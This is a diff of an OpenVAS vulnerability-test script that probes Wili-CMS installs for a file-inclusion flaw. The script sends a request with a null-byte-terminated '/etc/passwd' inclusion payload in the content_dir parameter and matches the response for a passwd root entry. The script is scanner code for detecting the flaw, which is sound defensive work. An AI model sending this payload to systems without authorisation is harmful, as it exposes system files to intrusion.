@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: wili_cms_remote_file_include.nasl 5231 2017-02-08 11:52:34Z teissa $
+# $Id: wili_cms_remote_file_include.nasl 5726 2017-03-24 16:45:01Z cfi $
 #
 # Wili-CMS remote and local File Inclusion and Authentication
 # Bypass
@@ -40,20 +40,22 @@ tag_solution = "Upgrade to a newer version if available at http://wili-cms.sourc
 if (description)
 {
  script_id(100021);
- script_version("$Revision: 5231 $");
- script_tag(name:"last_modification", value:"$Date: 2017-02-08 12:52:34 +0100 (Wed, 08 Feb 2017) $");
+ script_version("$Revision: 5726 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-24 17:45:01 +0100 (Fri, 24 Mar 2017) $");
  script_tag(name:"creation_date", value:"2009-03-10 08:40:52 +0100 (Tue, 10 Mar 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-
  script_name("Wili-CMS remote and local File Inclusion and Authentication Bypass");
  script_category(ACT_GATHER_INFO);
-  script_tag(name:"qod_type", value:"remote_vul");
+ script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
+
+ script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/8166/");
+
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
@@ -62,28 +64,24 @@ if (description)
 include("http_func.inc");
 include("http_keepalive.inc");
 
-port = get_http_port(default:80);
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) ) exit( 0 );
 
-if(!get_port_state(port))exit(0);
-if(!can_host_php(port:port)) exit(0);
+foreach dir( make_list_unique( "/cms", cgi_dirs( port:port ) ) ) {
 
-dir = make_list("/cms", cgi_dirs());
+  if( dir == "/" ) dir = "";
+ 
+  url = string(dir, "/?npage=-1&content_dir=/etc/passwd%00");
+  req = http_get( item:url, port:port );
+  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
+  if( buf == NULL ) continue;
 
-foreach d (dir)
-{ 
- url = string(d, "/cms/?npage=-1&content_dir=/etc/passwd%00");
- req = http_get(item:url, port:port);
- buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
- if( buf == NULL )continue;
- if (
-     egrep(pattern:"root:x:0:[01]:.*", string: buf) ||
-     egrep(pattern:"Warning.*:+.*include\(/etc/passwd\).*failed to open stream", string: buf) # /etc/passwd not found or not allowed to access. Windows or SAFE MODE Restriction.
-    )
-     
- 	{    
-       	  security_message(port:port);
-          exit(0);
-        }
+  if ( egrep( pattern:"root:x:0:[01]:.*", string:buf ) ||
+       egrep( pattern:"Warning.*:+.*include\(/etc/passwd\).*failed to open stream", string:buf ) ) { # /etc/passwd not found or not allowed to access. Windows or SAFE MODE Restriction.    
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit( 0 );
+  }
 }
 
-exit(0);
+exit( 99 );
